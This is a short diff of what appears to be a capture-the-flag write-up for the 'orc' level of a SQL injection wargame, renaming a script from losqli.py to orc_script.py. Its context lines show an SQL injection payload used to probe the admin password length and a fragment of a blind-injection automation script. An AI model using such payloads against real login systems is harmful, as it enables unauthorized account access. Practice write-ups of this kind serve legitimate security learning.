@@ -170,7 +170,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='095a9852'
 
 We can automate the entire process using a script.
 
-```py title="orc script"
+```py title="orc_script.py"
 import requests
 import urllib.parse
 import string
@@ -219,7 +219,7 @@ print(f"Final payload: ?pw={password}")
 ```
 
 ```
-$ python .\losqli.py
+$ python .\orc_script.py
 
 Payload: ?pw=' OR id='admin' AND length(pw)=8 -- -
 Password length: 0
